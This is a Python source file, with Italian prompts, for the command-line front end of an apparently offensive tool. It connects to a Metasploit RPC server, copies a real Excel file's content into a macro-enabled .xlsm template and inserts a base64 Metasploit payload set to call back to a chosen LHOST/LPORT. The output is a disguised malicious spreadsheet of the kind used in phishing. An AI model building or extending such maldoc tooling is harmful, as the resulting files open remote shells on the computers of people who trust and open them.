import time
from excel_handler import ExcelHandler
from payload_handler import PayloadHandler

class Cli:
    def __init__(self, logger, excel_handler: ExcelHandler, payload_handler: PayloadHandler):
        self.logger = logger
        self.excel_handler = excel_handler
        self.payload_handler = payload_handler

    def start(self):
        self.logger.info("Inserisci i parametri richiesti: \n")

        #msfconsole
        #load msgrpc
        # File Excel e template

        excel = input("Percorso del file Excel sorgente (.xlsx): ").strip()
        template = input("Percorso del file template (.xlsm) contenente macro: ").strip()

        # Parametri per la connessione a Metasploit
        msf_password_input = input("Password per Metasploit: ").strip()
        msf_host_input = input("Indirizzo host di Metasploit (default 127.0.0.1): ").strip() or "127.0.0.1"
        msf_port_input = input("Porta di Metasploit (default 55552): ").strip() or "55552"
        try:
            msf_port = int(msf_port_input)
        except ValueError:
            self.logger.error("Porta Metasploit non valida, utilizzo il valore di default 55552.")
            msf_port = 55552

        # Parametri per il payload
        payload_flag = input("Generare payload e inserirlo nel template? (s/n): ").strip().lower()
        if payload_flag.startswith('s'):
            generate_payload = True
            lhost = input("Indirizzo LHOST per il payload (default 127.0.0.1): ").strip() or "127.0.0.1"
            lport_input = input("Porta LPORT per il payload (default 4444): ").strip() or "4444"
            try:
                lport = int(lport_input)
            except ValueError:
                self.logger.error("Porta LPORT non valida, utilizzo il valore di default 4444.")
                lport = 4444
        else:
            generate_payload = False
            lhost = None
            lport = None

        # Imposta i percorsi per Excel
        self.excel_handler.filename = excel
        self.excel_handler.template = template

        # Imposta i parametri di connessione in PayloadHandler
        self.payload_handler.password = msf_password_input
        self.payload_handler.host = msf_host_input
        self.payload_handler.port = msf_port

        # Tenta la connessione a Metasploit con meccanismo di retry
        while True:
            try:
                client = self.payload_handler.connect()
                break
            except Exception as e:
                error_msg = f"Errore durante la connessione a Metasploit: {e}"
                self.logger.error(error_msg)
                retry = input("Ritentare la connessione? (s/n): ").strip().lower()
                if not retry.startswith('s'):
                    self.logger.info("Uscita dal programma.")
                    time.sleep(5)
                    exit(1)
                else:
                    self.logger.info("Ritento la connessione...")

        # Workflow:
        # 1. Carica file sorgente e template
        self.excel_handler.load_source()
        self.excel_handler.load_template()
        # 2. Copia il contenuto 1:1 dal file sorgente al template
        self.excel_handler.copy_content()
        # 3. Se richiesto, genera il payload e lo inserisce nelle celle previste
        if generate_payload:
            payload_b64 = self.payload_handler.generate_payload(lhost, lport)
            if payload_b64:
                self.excel_handler.write_payload_to_cells(payload_b64)
            else:
                self.logger.error("Generazione del payload fallita.")
        # 4. Salva il file finale in formato .xlsm preservando le macro
        self.excel_handler.save_workbook(save_as_new=False)
